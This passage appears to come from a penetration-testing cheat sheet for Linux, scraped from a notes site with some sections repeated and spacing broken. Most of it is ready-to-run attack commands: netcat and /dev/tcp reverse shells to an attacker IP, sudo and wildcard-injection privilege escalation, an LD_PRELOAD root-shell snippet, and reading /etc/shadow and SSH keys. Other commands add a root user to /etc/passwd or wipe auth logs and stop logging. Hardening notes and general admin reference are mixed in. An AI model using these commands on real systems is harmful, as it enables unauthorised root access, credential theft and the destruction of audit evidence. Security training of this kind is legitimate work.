word1|word2 / path / to / file - n Line number - c Count - v Invert - x Exact match - l File names with match - L File names without match iptables count packets sent and received iptables - Z iptables - F iptables - I INPUT 1 - s IP - j ACCEPT iptables - I OUTOUT 1 - d IP - j ACCEPT ip tables - vn - L Netcat Chat nc - nlvp 4444 nc - nv ip 4444 File Transfer nc - nlvp 4444 file . exe nc - nv ip 4444 file . exe Bind Shell VICTIM (server): nc - lvp 4444 - e cmd . exe ATTACKER (client): nc - nv IP Address 4444 Reverse Shell ATTACKER (server): nc - lvp 4444 VICTIM (client): nc - nv IP Address 4444 - e cmd . exe NCAT for increased security VICTIM (server): ncat - lvp 4444 - e cmd . exe --allow 192.168.30.5 --ssl ATTACKER (client): ncat - nv IP Address 4444 --ssl Port Scanning TCP Connect Port Scan: nc - nvv - w 1 - z ip 1 - 65550 UDP Scan: nc - unvv - w 1 - z ip 1 - 65550 tcpdump Packet Capture tcpdump tcp dst [ ip ] [ port ] and tcp dst [ ip ] [ port ] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 Open a PCAP: tcpdump - \u00ad r password_cracking_filtered . pcap Cut only IP addresses from the traffic: tcpdump - \u00ad r password_cracking_filtered . pcap | awk - \u00ad\u2010 F {print $3} | sort - \u00ad\u2010 u | head Filter Destination or Source tcpdump - n src host ip - \u00ad r password_cracking_filtered . pcap tcpdump - n dst host ip \u2010 r password_cracking_filtered . pcap tcpdump - n port port - \u00ad r password_cracking_filtered . pcap Advanced Header Filtering: tcpdump - A - n tcp[13] = 24 - \u00ad\u2010 r password_cracking_filtered . pcap Other important flags - nn stop DNS and service names lookup (performance+) - X and - XX can be used to print each packet in hex and ascii - A print packets in ASCII - S to print absolute sequence numbers - s can be used to increase the default snap-length from 262144 to higher - s 0 to capture full packet References: https://hackertarget.com/tcpdump-examples/ General Exploits Enumeration Scripts BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py LinEnum: https://github.com/rebootuser/LinEnum Lse.sh: https://github.com/diego-treitos/linux-smart-enumeration LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite Escape shell Information about environment: env echo $ PATH echo / usr / local / rbin /* List read only variables (check If PATH or SHELL is writable): export - p VI / VIM: : set shell =/ bin / bash : shell : sh | : ! / bin / bash | : r / root / root . txt | : e / root / root . txt AWK: awk BEGIN {system( /bin/sh )} Find: find / - name blahblah - exec / bin / awk BEGIN {system( /bin/sh )} \\ ; More / Less / Man: ! / bin / sh !/ bin / sh !bash Tee: echo evil script code | tee script . sh Languages python: exit_code = os.system ( /bin/sh ) output = os.popen ( /bin/sh ) .read () perl -e exec /bin/sh ; perl: exec /bin/sh ; ruby: exec /bin/sh lua: os.execute ( /bin/sh ) irb ( main:001:0 exec /bin/sh Copy files into $ PATH Copy file into HOME (scp/ftp) Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an restricted mode and it's editable) If HISTFILE and HISTSIZE are writable: Set HISTFILE to the file you want to overwrite (preferably an executable) Set HISTSIZE to 0 and then back to 100, Then execute the lines you want in your shell script https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ Wildcards Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory. Using wildcard to inject arguments # ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # strace rm * execve ( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ] , [ /* 25 vars */ ]) = 0 chown --reference=RFILE use RFILE s owner and group rather than specifying OWNER : GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php chmod --reference = RFILE use RFILE s mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17 :36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php tar command Execution --checkpoint [= NUMBER ] display progress messages every NUMBERth record ( default 10 ) --checkpoint-action = ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19 :19 --checkpoint = 1 -rw-r--r--. 1 leon leon 0 Oct 28 19 :17 --checkpoint-action = exec = sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19 :17 shell.sh # tar cf archive.tar * uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Rcync command Execution -e, --rsh = COMMAND specify the remote shell to use --rsync-path = PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed ( 0 bytes received so far ) [ sender ] rsync error: error in rsync protocol data stream ( code 12 ) at io.c ( 601 ) [ sender = 3 .0.8 ] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04 :49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Practice HTB - Joker Create a script, setuid bit and then use this attack to chown the script to gain prev-esc Exploits Related to Tools Tar: sudo tar - cf / dev / null / dev / null -- checkpoint = 1 -- checkpoint - action = exec =/ bin / bash echo -e #!/bin/bash\\n\\nbash -i /dev/tcp/10.10.15.99/8082 0 1 a.sh tar -cvf a.tar a.sh sudo tar -xvf a.tar --to-command /bin/bash Zip: sudo zip / tmp / test . zip / tmp / test - T --unzip-command= sh -c /bin/bash Strace: sudo strace - o / dev / null / bin / bash tcpdump echo $\u2019id \\n cat /etc/shadow\u2019 /tmp/.shell chmod +x /tmp/.shell sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root nmap echo os.execute( /bin/sh ) / tmp / shell . nse sudo nmap --script=/tmp/shell.nse scp: sudo scp - S / path / yourscript x y except: sudo except spawn sh then sh nano: sudo nano - S / bin / bash type your command and hit CTRL+T git: sudo git help status type: !/bin/bash gdb/ftp: sudo ftp type : !/bin/sh Other File execution due to not using quotes # Files in `SLAPPER_FILES` list will get executed: for i in ${ SLAPPER_FILES } ; do if [ -f ${ i } ] ; then file_port = $file_port $i # Correction: file_port= $file_port $i STATUS = 1 fi done Ref: https://www.exploit-db.com/exploits/33899 Connect to existing TMUX session: tmux - S / . devs / dev_sess \u200b Screenshot Need video group access Resolution: cat / sys / class / graphics / fb0 / virtual_size Video feed: Open \u200b / dev / fb0 \u200b in a image editor cp /dev/fb0 screenshot.raw iraw2png 1024 768 screenshot.raw screenshot.png fbdump https://www.kernel.org/doc/Documentation/fb/framebuffer.txt Important Groups shadow - can read /etc/shadow disk - raw access to files debugfs / dev / sda1 debugfs : cat /root/.ssh/i d_rsa debugfs : cat /etc/s hadow video - access to framebuffer cat / dev / fb0 / tmp / screen . raw cat / sys / class / graphics / fb0 / virtual_size root find / - group root - perm - g = w 2 / dev / null Privilege Escalation: http://www.dankalia.com/tutor/01005/0100501004.htm Abusing users with '.' in their PATH Shell Escape Sequences IFS Exploit LD_PRELOAD Exploit cat /etc/ld.so.conf cat /etc/ld.so.conf.d/* #include stdio.h #include sys/types.h #include stdlib.h void _init () { unsetenv ( LD_PRELOAD ); setgid ( 0 ); setuid ( 0 ); system ( /bin/sh ); } // gcc -fPIC -shared -o shell.so shell.c -nostartfiles // sudo LD_PRELOAD=/home/admin/shell.so apache2 Symlinks Get root shell from a limited account From root: chmod + s / bin / bash From limited account: / bin / bash Find plain text username / password grep -i user [ filename ] grep -i pass [ filename ] grep -C 5 password [ filename ] find . -name *.php -print0 | xargs -0 grep -i -n var $password # Joomla Commands with sudo: sudo - l New file Permissions: umask Generate password hash (md5): openssl passwd - 1 echo joske | openssl passwd - 1 - stdin Generate password hash (sha256): python - c import crypt; print crypt.crypt( joske ) Add user with passwd echo user2:*:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd passwd user2 echo user2:`openssl passwd -1 -salt user3 pass123`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`mkpasswd -m SHA-512 pass`:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`python -c import crypt; print crypt.crypt( pass , $6$salt ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`perl -le print crypt( pass123 , abc ) `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd echo user2:`php -r print ( crypt ( aarti , 123 ) . \\ \\n\\ ) ; `:1002:1003:,,,:/home/user2:/bin/bash /etc/passwd Add root user adduser username usermod -aG sudo username echo trevelyn::0:0:root:/root:/bin/bash /etc/passwd Change user password echo trevelyn:trevelyn | /usr/sbin/chpasswd References http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/ Linux Local Privilege Escalation via SUID /proc/pid/mem Write - https://git.zx2c4.com/CVE-2012-0056/about/ https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt Important Files GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions: https://gtfobins.github.io/ Files owned by User: find / - type f - uid 1000 - ls 2 / dev / null Environment variables: / proc / self / environ Email: / var / log / mail / USER Private keys: ~/ . ssh / id_rsa APT sources: / etc / apt / sources . list Order of name resolution: / etc / nsswitch . conf DNS Hosts File: / etc / hosts DNS sever Information: / etc / resolv . conf Kernel module config: / etc / sysctl . conf Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h Os Info: / etc / issue / proc / version Cron: / etc / crontab Bootloader - GRUB2 Main configuration file (replaces menu . lst in GRUB (v1)): / boot / grub / grub . cfg Directory contains the scripts that build the grub . cfg : / etc / grub . d 00 _header - Loads the settings from / etc / default / grub 05 _debian_theme - Defines the colors, background, etc. 10 _linux - Loads the menu entries 20 _memtest86 - Loads the memory tester 30 _os - prober - Scans the hard drives for other operating systems 40 _custom - Template for manually adding other menu entries File contains the GRUB menu settings: / etc / default / grub Run update - grub after modifying. Samba: / etc / samba / smb . conf Logs: Syslog: / etc / rsyslog . conf Log mail events of all priorities to /var/log/mail: mail . * / var / log / mail Log all events of the emergency priority (emerg) to all logged on users: .emerg Squid Proxy: / etc / squid / squid . conf / etc / squid / passwords Apache: / var / log / apache2 / access . log / etc / apache2 / sites - enabled / 000 - default . conf / etc / apache / sites - enabled / 000 - default . conf / etc / httpd / sites - enabled / 000 - default . conf TFTPD: / etc / default / tftpd - hpa PHP Sessions: / tmp / sess_ID / var / lib / php5 / sess_ID / etc / issue / proc / version / etc / profile / root / . bash_history / var / log / dmessage / var / mail / root / var / spool / cron / crontabs / root Passwords / etc / passwd / etc / shadow / etc / pwd . db / etc / passwd / etc / spwd . db / etc / shadow / etc / master . passwd Special File Handling 7z files Print file information: 7 z l - slt example . zip Extract: 7 z x example . zip Microsoft Outlook Personal Folder (PST) Examine: readpst - tea - m example . pst Defense References PAM vs NSS: https://serverfault.com/questions/538383/understand-pam-and-nss/ Support to authenticate against PostgreSQL for PAM-enabled appliations: https://github.com/pam-pgsql/pam-pgsql Point of no C3 | Linux Kernel Exploitation https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585 https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850 Tools Locally checks for signs of a rootkit: http://www.chkrootkit.org/ Checklists Linux hardening checklist: https://github.com/trimstray/linux-hardening-checklist Kernel hardning checklist: https://github.com/a13xp0p0v/kconfig-hardened-check AppArmor 2.6.36 + allows to restrict programs capabilities with per-program profiles. Linux kernel security module that allows the system administrator to restrict programs\u2019 capabilities with per-program profiles supplements the traditional Unix discretionary access control (DAC) model by providing mandatory access control (MAC). SELinux provides a mechanism for supporting access control security policies, including\u2026(MAC) set of kernel modifications and user-space tools separate enforcement of security decisions from the security policy streamlines the volume of software charged with security policy enforcement Seccomp 2.6.12 + used for filtering syscalls issued by a program secure computing mode, [seccomp] is a computer security facility in the Linux kernel allows a process to make a one-way transition into a \u201csecure\u201d state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors kernel will terminate the process with SIGKILL, if anyother syscall was tried does not virtualize the system\u2019s resources but isolates the process from them entirely Capabilties for performing permission checks. Grsecurity A set of patches for the Linux kernel which emphasize security enhancements collection of security features to the Linux kernel, including address space protection, enhanced auditing and process control PAX","title":"Linux"},{"location":"linux/#quick-reference","text":"Bash cheatsheet: https://devhints.io/bash.html Archiving/compressing: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/","title":"Quick Reference"},{"location":"linux/#general-information","text":"System Information cat /proc/net/dev lspci ip link show ip addr show lscpu cat /proc/cpuinfo File information: file filename Shared library dependencies: ldd filename Searching: With database: updatedb ; locate sbd . exe Within PATH: which sbd whereis sdb Complex: find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; Search for hidden (dot) files find / - type d - name .* Mounting Devices: mount -t filesystemtype location mount -t /dev/cdrom /media umount /dev/cdrom Distribution cat / etc / issue cat / etc /*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based Environment cat / etc / profile cat / etc / bashrc cat ~/ . bash_profile cat ~/ . bashrc cat ~/ . bash_logout env set Printers: lpstat - a Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h New line in command line $ echo abc[CTRL+M] def Change password (one liner): echo root : password | / usr / sbin / chpasswd Bash Variables: $ 0 - The name of the Bash script $ 1 - $9 - The first 9 arguments to the Bash script $ # - Number of arguments passed to the Bash script $ @ - All arguments passed to the Bash script $ ? - The exit status of the most recently run process $$ - The process ID of the current script $ USER - The username of the user running the script $ HOSTNAME - The hostname of the machine $ RANDOM - A random number $ LINENO - The current line number in the script Cron: Shortcuts: @yearly @annually @monthly @weekly @daily @midnight @noon @reboot","title":"General Information"},{"location":"linux/#logging","text":"locate rsyslog Config: / etc / rsyslog . conf Rotation: / etc / logrotate . conf Removing evidence: shred - f - n 10 / var / log / auth . log . * Disable: service rsyslog stop","title":"Logging"},{"location":"linux/#kernel","text":"eBPF is a revolutionary technology that can run sandboxed programs in the Linux kernel without changing kernel source code or loading kernel modules. By making the Linux kernel programmable, infrastructure software can leverage existing layers, making them more intelligent and feature-rich without continuing to add additional layers of complexity to the system.: https://ebpf.io/ To communicate with the kernel, different UNIX systems use different interfaces https://opensource.com/article/19/3/virtual-filesystems-linux Source of VFS: https://www.tldp.org/LDP/khg/HyperNews/get/fs/vfstour.html filesystem, must implement the open(), read(), and write() methods kernel treats the generic filesystem as an abstract interface, and these big-three functions are \"virtual,\" with no default definition filesystems like ext4, NFS, and /proc all provide definitions of the big-three functions in a C-language data structure called file_operations filesystems extend and override the VFS functions in the familiar object-oriented way The function definitions that belong to the VFS base type itself are found in the fs/*.c files in kernel source, while the subdirectories of fs/ contain the specific filesystems. https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs Listing VFSs: mount | grep - v sd | grep - v : / tempfs (/tmp) https://wiki.archlinux.org/index.php/Tmpfs By default, a tmpfs partition has its maximum size set to half of the available RAM Under systemd, /tmp is automatically mounted as a tmpfs even though no entry is specified in /etc/fstab. tmp . mount systemd unit. procfs (/proc) https://man7.org/linux/man-pages/man5/procfs.5.html a snapshot into the instantaneous state of the kernel and the processes that it controls for userspace special in-memory filesystem used to present process information, kernel processes and other system information in a hierarchical file-like structure This layer is expected to provide convenient access to the said information, acting as an interface to internal data structures in the kernel / proc / sys is where the settings that are configurable via the sysctl command are accessible to userspace File sizes are zero (/proc/meminfo). The truth is that the kernel gathers statistics about memory when a process requests them from /proc Structure: https://www.thegeekdiary.com/understanding-the-proc-file-system/ https://en.wikipedia.org/wiki/Procfs#Linux http://www.noah.org/wiki//proc Implementation details: https://www.kernel.org/doc/Documentation/filesystems/proc.txt https://elixir.bootlin.com/linux/v5.8-rc4/source/fs/proc https://github.com/torvalds/linux/tree/master/fs/proc Important items: / proc / PID / cmdline : which contains the command which originally started the process Read confidential information passed in as arguments / proc / PID / environ : a file containing the names and contents of the environment variables that affect the process Read confidential information passed in as environment variables (specially useful in containerized environments, since this is a common practice) / proc / PID / mem : a binary image representing the process's virtual memory, can only be accessed by a ptrace'ing process Useful in dumping process memory , but with limitations / proc / PID / maps : the memory map showing which addresses currently visible to that process are mapped to which regions in RAM or to files Useful in binary exploitation (offset calculations, etc.) / proc / cpuinfo : containing information about the CPU Identifying CPU architecture. Useful in binary exploitations to create matching payloads. / proc / version : containing the Linux kernel version, distribution number, gcc version number used to build the kernel and any other pertinent information relating to the version of the kernel currently running Identifying operating system related information architecture. Useful in binary exploitations to create matching payloads. / proc / net / : a directory containing useful information about the network stack, in particular /proc/net/nf_conntrack, which lists existing network connections Get information about network stack and connections. / proc / modules : containing a list of the kernel modules currently loaded . It gives some indication (not always entirely correct) of dependencies. Useful in binary exploitations to create matching payloads. / proc / mounts : a symlink to self/mounts which contains a list of the currently mounted devices and their mount points Get information about the mounted devices (for example: through LFI) / proc / kcore : represents the physical memory of the system (kernel virtual address space region of memory) and is stored in the ELF core file format. (examined by gdb, objdump) / dev / kmem : gives access to the kernel's virtual memory space / dev / mem : gives access to physical memory. / proc / kmsg : used to hold messages generated by the kernel (picked by /bin/dmesg). Sysfs Structured approach to clean-up procfs expose the readable and writable properties of what the kernel calls \"kobjects\" to userspace purpose of kobjects is reference-counting: when the last reference to a kobject is deleted, the system will reclaim the resources associated with it https://www.kernel.org/doc/Documentation/kobject.txt constitutes most of the kernel's famous \" stable ABI to userspace \" which no one may ever, under any circumstances, \"break.\" eBPF (extended Berkeley Packet Filter) consists of a virtual machine running inside the kernel that privileged users can query from the command line running eBPF tools on a booted system shows instead what the kernel actually does https://github.com/iovisor/bcc/tree/master/tools vfscount or vfsstat Used by udev to access device and device driver information Sysfs helped clean up the proc file system because much of the hardware information has been moved from proc to sysfs Important items: /sys/bloc: information about block devices /sys/bus: physical bus type supported in the kernel /sys/class: devices classes registered /sys/devices: global device hierarchy of all devices on the system /sys/firmware: firmware objects and attributes /sys/module: subdirectories for each module that is loaded into the kernel /sys/power: system power state can be controlled from this directory. sysctl Usable to change values in / proc / sys directory View current kernel configuration: sysctl - a echo 1 / proc / sys / net / ipv4 / ip_forward sysctl - w net . ipv4 . ip_forward = 1 To make permanent changes, add to / etc / sysctl . conf General information: cat / proc / version uname - a uname - mrs rpm - q kernel dmesg | grep Linux ls / boot | grep vmlinuz - Kernel tuning: Temporary: sysctl sysctl - w net . ipv4 . ip_forward = 1 Permanent: / etc / sysctl . conf View configuration: sysctl - a | less View configuration files for the installed modprobe modules: ls - l / etc / modprobe . d / ls - R / lib / modules / $ ( uname - r ) / kernel Kernel Modules: loadable kernel modules, or LKMs. - Linux has the capability of adding some modules to the kernel without going through rebuilding kernel rootkit embeds itself into the kernel of the operating systems, often through these LKMs Insert module: insmod modprobe - a module name Remove module: modprobe - r module name rmmod List modules: modprobe - l module name lsmod Module info: modinfo bluetooth View logs: dmesg Solaris (IOCTLs) are used for communication between user-mode applications and the kernel List IOCTLs on Solaris Kernel: cd on - src / usr / src / uts grep - rnw - e _IOR - e _IOW - e _IOWR *","title":"Kernel"},{"location":"linux/#startup-process","text":"https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ Run levels 0 - halt the system 1 - single user mode ( minimal services ) 2 - multi - user mode 3 - multi - user mode 4 - multi - user mode 5 - multi - user mode 6 - reboot the system Init.d Process Has process ID: 1 / etc / init . d scripts with 755 permission init process then hands over the boot-up processes to rc . d daemon rc.local - Script to start necessary processes in the background when the system boots up: / etc / init . d / rc . local You can add services for the rc.d script to run at startup using the update-rc.d command. update - rc . d name of the script or service remove | defaults | disable | enable update - rc . d postgresql defaults Run at startup GUI for startup tasks: rcconf","title":"Startup Process"},{"location":"linux/#daemons","text":"inetd , xinetd - Inetd always runs in the background and it then decides when to start and stop other daemons. rlinetd rlinetd . conf / etc / rlinetd . d Disable unnecessary demons Configure IPs that can access a demon","title":"Daemons"},{"location":"linux/#managing-disks","text":"Managing Hard Disks hda for hard disks. sda for newer SATA disks (SCSI). Partitions within sda are sda1 , sda2 , ... Basic disk Information: df - h Partitions on disk: fdsisk - l Block device information: lsblk Editing and displaying partitions: parted / cfdisk ( parted ) print ( parted ) select / dev / sdb Change HDD parameters: hdparm Information about mounts: df - h Check errors: fsck after umount . - p to auto fix. Debugfs Simple-to-use RAM-based file system specially designed for debugging purposes Mount file system (usable to access / root by only being in disk group) debugfs / dev / sda1 dd if =/ dev / sdb of =/ root / flashcopy (block size 512) dd if =/ dev / media of =/ root / flashcopy bs = 4096 conv : noerror","title":"Managing Disks"},{"location":"linux/#permissions","text":"Linux automatically assigns base permissions\u2014usually 666 for files and 777 for directorie umask method represents the permissions you want to remove from the base permissions on a file or directory to make them more secure umask number is subtracted from the permissions number to give the new permissions status Debian systems, the umask is preconfigured to 022 644 for files 755 for directories File Permissions: 0 = No Permission 1 = Execute 2 = Write 4 = Read r w x 4 2 1 = 7 Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs Find SUID: find . - perm / 4000 Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html Find GUID: find . - perm / 2000 Find SUID / SGID: find . - perm / 6000 Find and ls SUID / SGID: find $DIRECTORY - perm / 6000 - exec ls - la {} \\ ; Searching world writable files: find / - perm - w ~ - type l - ls 2 ?/ dev / null Check file permissions of / etc / passwd and / etc / shadow Find writable files: find - type f - maxdepth 1 - writable","title":"Permissions"},{"location":"linux/#processes","text":"Running processes: ps aux ps - ef top Tree of processes (processes threads): pstree - aclp Process priority: nice - n - 20 command renice nice - value pid - 20 is highest priority 19 is lowest priority Memory map for a process: cat / proc / 1234 / maps gdb info proc mappings pmap - d 1234 / proc - / proc / id / environ environment variables - / proc / id / cmdline command line args/command used to run the process - / proc / id / maps memory map - / proc / id / fd open file descriptors Trace system and library calls ltrace strace Access control access - Check permissions for the UID and GID of the process (executable file owner / group) Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} )","title":"Processes"},{"location":"linux/#services","text":"List of Services: cat / etc / services Commons service configurations cat / etc / syslog . conf cat / etc / chttp . conf cat / etc / lighttpd . conf cat / etc / cups / cupsd . conf cat / etc / inetd . conf cat / etc / apache2 / apache2 . conf cat / etc / my . conf cat / etc / httpd / conf / httpd . conf cat / opt / lampp / etc / httpd . conf ls - aRl / etc / | awk $ 1 ~ /^ . * r . */ Check if certain service is up: update - \u00ad\u2010 rc . d ssh enable Auto start a service: update - \u00ad\u2010 rc . d ssh enable Systemd services: / lib / systemd / system / snapd . service Systemd socket unit file: [Socket] ListenStream = /run/snapd.socket ListenStream = /run/snapd-snap.socket SocketMode = 0666 0666 - Allow any process to connect and communicate with the socket.","title":"Services"},{"location":"linux/#networking","text":"Interface Information / sbin / ifconfig - a cat / etc / network / interfaces cat / etc / sysconfig / network Network configuration cat / etc / resolv . conf cat / etc / sysconfig / network cat / etc / networks iptables - L hostname dnsdomainname Monitor network communication lsof - i lsof - i : 80 grep 80 / etc / services netstat - antup netstat - antpx netstat - tulpn chkconfig --list chkconfig --list | grep 3:on last w Cached IP and Mac Information arp - e route / sbin / route - nee Change IP ifconfig eth0 192 . 168 . 1 . 115 ifconfig eth0 192 . 168 . 1 . 115 netmask 255 . 255 . 255 . 0 broadcast 192 . 168 . 1 . 255 Shell with built-in tools nc - lvp 4444 ### Attacker . Input ( Commands ) nc - lvp 4445 ### Attacker . Ouput ( Results ) telnet [ atackers ip ] 44444 | / bin / sh | [ local ip ] 44445 ### On the targets system . Use the attackers IP ! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ AF_UNIX - Used to communicate between processes on the same machine AF_INET and AF_INET6 - Used for processes to communicate over a network connection. Interact with AF_UNIX Socket nc - U / run / snapd . socket GET / HTTP / 1 . 1 Host : 127 . 0 . 0 . 1 Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Tools Ship - one-stop-shop for basic network reconnaissance and addressing: https://github.com/xtonousou/ship.git https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/","title":"Networking"},{"location":"linux/#tools","text":"grep Color word root: grep --color root /etc/passwd OR: grep - e how - e to - e forge * . txt https://www.howtoforge.com/tutorial/linux-grep-command/ Option Details - i Ignore case - r - R Recursive grep - R example / etc / apache2 / - w Match words - e Regex match grep - w - e word1|word2 / path / to / file - n Line number - c Count - v Invert - x Exact match - l File names with match - L File names without match iptables count packets sent and received iptables - Z iptables - F iptables - I INPUT 1 - s IP - j ACCEPT iptables - I OUTOUT 1 - d IP - j ACCEPT ip tables - vn - L Netcat Chat nc - nlvp 4444 nc - nv ip 4444 File Transfer nc - nlvp 4444 file . exe nc - nv ip 4444 file . exe Bind Shell VICTIM (server): nc - lvp 4444 - e cmd . exe ATTACKER (client): nc - nv IP Address 4444 Reverse Shell ATTACKER (server): nc - lvp 4444 VICTIM (client): nc - nv IP Address 4444 - e cmd . exe NCAT for increased security VICTIM (server): ncat - lvp 4444 - e cmd . exe --allow 192.168.30.5 --ssl ATTACKER (client): ncat - nv IP Address 4444 --ssl Port Scanning TCP Connect Port Scan: nc - nvv - w 1 - z ip 1 - 65550 UDP Scan: nc - unvv - w 1 - z ip 1 - 65550 tcpdump Packet Capture tcpdump tcp dst [ ip ] [ port ] and tcp dst [ ip ] [ port ] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 Open a PCAP: tcpdump - \u00ad r password_cracking_filtered . pcap Cut only IP addresses from the traffic: tcpdump - \u00ad r password_cracking_filtered . pcap | awk - \u00ad\u2010 F {print $3} | sort - \u00ad\u2010 u | head Filter Destination or Source tcpdump - n src host ip - \u00ad r password_cracking_filtered . pcap tcpdump - n dst host ip \u2010 r password_cracking_filtered . pcap tcpdump - n port port - \u00ad r password_cracking_filtered . pcap Advanced Header Filtering: tcpdump - A - n tcp[13] = 24 - \u00ad\u2010 r password_cracking_filtered . pcap Other important flags - nn stop DNS and service names lookup (performance+) - X and - XX can be used to print each packet in hex and ascii - A print packets in ASCII - S to print absolute sequence numbers - s can be used to increase the default snap-length from 262144 to higher - s 0 to capture full packet References: https://hackertarget.com/tcpdump-examples/","title":"Tools"},{"location":"linux/#general-exploits","text":"Enumeration Scripts BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py LinEnum: https://github.com/rebootuser/LinEnum Lse.sh: https://github.com/diego-treitos/linux-smart-enumeration LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite Escape shell Information about environment: env echo $ PATH echo / usr / local / rbin /* List read only variables (check If PATH or SHELL is writable): export - p VI / VIM: : set shell =/ bin / bash : shell : sh | : ! / bin / bash | : r / root / root . txt | : e / root / root . txt AWK: awk BEGIN {system( /bin/sh )} 